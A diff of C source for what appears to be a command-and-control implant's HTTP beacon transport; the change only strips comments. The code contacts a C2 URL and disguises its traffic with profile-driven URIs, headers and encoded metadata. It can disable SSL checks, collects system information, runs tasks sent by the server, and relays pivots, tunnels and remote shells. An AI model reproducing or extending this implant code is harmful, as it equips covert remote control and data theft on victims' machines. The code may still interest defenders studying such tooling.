@@ -113,7 +113,6 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
     PCHAR     meta_enc      = NULL;
     PWCHAR    hdrs          = NULL;
 
-    /* Select URI from profile or use bootstrap URL */
     WCHAR use_url[256];
     if ( Nax->Config.ProfileLoaded && Nax->Config.PostUriCount > 0 ) {
         BYTE idx  = Nax->Config.PostUriIdx;
@@ -126,7 +125,6 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
         use_url[len] = L'\0';
     }
 
-    /* Parse URL components */
     URL_COMPONENTS uc;
     MmZero( &uc, sizeof( uc ) );
     uc.dwStructSize     = sizeof( uc );
@@ -140,7 +138,6 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
 
     if ( ! NaxHttpEnsureSession( Nax, host, uc.nPort ) ) goto cleanup;
 
-    /* Encode session ID per PostClientMeta OutputConfig */
     meta_enc = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 2048 );
     UINT32 meta_enc_len = 0;
     UINT32 sid_len = 0;
@@ -151,7 +148,6 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
         if ( meta_enc_len > 0 ) meta_enc[ meta_enc_len ] = '\0';
     }
 
-    /* Encode body per PostClientOutput OutputConfig */
     PBYTE  send_body     = (PBYTE)body;
     UINT32 send_body_len = body_len;
 
@@ -184,7 +180,6 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
             NaxHttpDisableSslVerify( Nax, hRequest );
     }
 
-    /* Build headers */
     hdrs = (PWCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 4096 );
     if ( Nax->Config.ProfileLoaded ) {
         NaxBuildRequestHeaders( Nax, sid, (const PCHAR)Nax->Config.PostClientHdrs, 256, Nax->Config.PostClientHdrCount, &Nax->Config.PostClientMeta, meta_enc_len > 0 ? meta_enc : NULL, meta_enc_len, TRUE, hdrs, 2048 );
@@ -210,10 +205,8 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
     if ( ! Nax->Winhttp.WinHttpReceiveResponse( hRequest, NULL ) )
         goto retry;
 
-    /* Read raw response */
     rc = NaxReadResponse( Nax, hRequest, resp_buf, resp_len );
 
-    /* Decode response per PostServerOutput if profile loaded */
     if ( rc == NAX_OK && *resp_len > 0 && Nax->Config.ProfileLoaded && ( Nax->Config.PostServerOutput.Format != NAX_FMT_RAW || Nax->Config.PostServerOutput.Mask || Nax->Config.PostServerOutput.PrependLen > 0 || Nax->Config.PostServerOutput.AppendLen > 0 ) ) {
         UINT32 dec_cap = *resp_len + 256;
         PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
@@ -248,7 +241,6 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
     PCHAR     meta_enc = NULL;
     PWCHAR    hdrs     = NULL;
 
-    /* Encode encrypted body per GetClientMeta OutputConfig */
     meta_enc = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 2048 );
     if ( !meta_enc ) return NAX_ERR_NOMEM;
     UINT32 meta_enc_len = 0;
@@ -263,7 +255,6 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
         if ( meta_enc_len == 0 ) { rc = NAX_ERR_NOMEM; goto cleanup; }
     }
 
-    /* Build URL from bootstrap host + profile GET URI */
     WCHAR use_url[256];
     if ( Nax->Config.GetUriCount > 0 ) {
         BYTE idx  = Nax->Config.GetUriIdx;
@@ -287,11 +278,9 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
     uc.dwUrlPathLength = 512;
     if ( ! Nax->Winhttp.WinHttpCrackUrl( use_url, 0, 0, &uc ) ) goto cleanup;
 
-    /* Ensure persistent session + connection */
     if ( ! NaxHttpEnsureSession( Nax, host, uc.nPort ) ) goto cleanup;
 
     {
-        /* Build final path with parameters (metadata + static params) */
         WCHAR final_path[1024];
         if ( Nax->Config.ProfileLoaded ) {
             NaxBuildPathWithParams( path_w, final_path, 1024, &Nax->Config.GetClientMeta, meta_enc, meta_enc_len, (const PCHAR)Nax->Config.GetClientParams, 128, Nax->Config.GetClientParamCount );
@@ -315,7 +304,6 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
             NaxHttpDisableSslVerify( Nax, hRequest );
     }
 
-    /* Build headers */
     hdrs = (PWCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 4096 );
     if ( Nax->Config.ProfileLoaded ) {
         NaxBuildRequestHeaders( Nax, sid, (const PCHAR)Nax->Config.GetClientHdrs, 256, Nax->Config.GetClientHdrCount, &Nax->Config.GetClientMeta, meta_enc, meta_enc_len, FALSE, hdrs, 2048 );
@@ -339,7 +327,6 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
         hdrs[ wi ] = L'\0';
     }
 
-    /* Determine body for WinHttpSendRequest based on placement */
     {
         PVOID  req_body     = NULL;
         DWORD  req_body_len = 0;
@@ -373,7 +360,6 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
         UINT32 readLen = readCap;
         rc = NaxReadResponse( Nax, hRequest, readBuf, &readLen );
 
-        /* Decode response per GetServerOutput if profile loaded */
         if ( rc == NAX_OK && readLen > 0 && Nax->Config.ProfileLoaded && ( Nax->Config.GetServerOutput.Format != NAX_FMT_RAW || Nax->Config.GetServerOutput.Mask || Nax->Config.GetServerOutput.PrependLen > 0 || Nax->Config.GetServerOutput.AppendLen > 0 ) ) {
             UINT32 dec_cap = readLen + 256;
             PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
@@ -515,18 +501,15 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
     PBYTE env_h    = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, FRAME_CAP );
     if ( !resp_h || !plain_h || !result_h || !frame_h || !env_h ) return;
 
-    /* session id */
     BYTE raw[8];
     Nax->Bcrypt.BCryptGenRandom( NULL, raw, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
     NaxHexEncode( raw, 8, Nax->SessionId );
     NaxDbg( Nax, "session: %s", Nax->SessionId );
     NaxDbg( Nax, "beacon_id_hdr: %s", Nax->Config.BeaconIdHdr );
 
-    /* C2 URL (wide) */
     WCHAR c2_url_w[128];
     NaxAsciiToWide( Nax->Config.C2Url, c2_url_w, 128 );
 
-    /* gather system info */
     NAX_SYSINFO info;
     NaxGatherSysInfo( Nax, &info );
 
@@ -669,7 +652,6 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
             Nax->DynRespLen = 0;
         }
 
-        /* dispatch tasks */
         PBYTE  cursor       = use_plain;
         UINT32 remaining    = plain_len;
         BOOL   hadTasks     = FALSE;
@@ -722,7 +704,6 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
             }
         }
 
-        /* relay pivots, downloads, jobs, tunnels */
         if ( Nax->PivotHead )
             HttpRelayPivots( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
 
@@ -738,9 +719,6 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
         if ( Nax->ShellHead )
             HttpRelayShells( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
 
-        /* Burst: when the server had tasks, re-check immediately so
-         * follow-up tasks queued during the sleep window are dispatched
-         * without waiting a full heartbeat cycle. */
         if ( hadTasks ) {
             NaxDbg( Nax, "[HB] burst: re-checking for tasks" );
             continue;
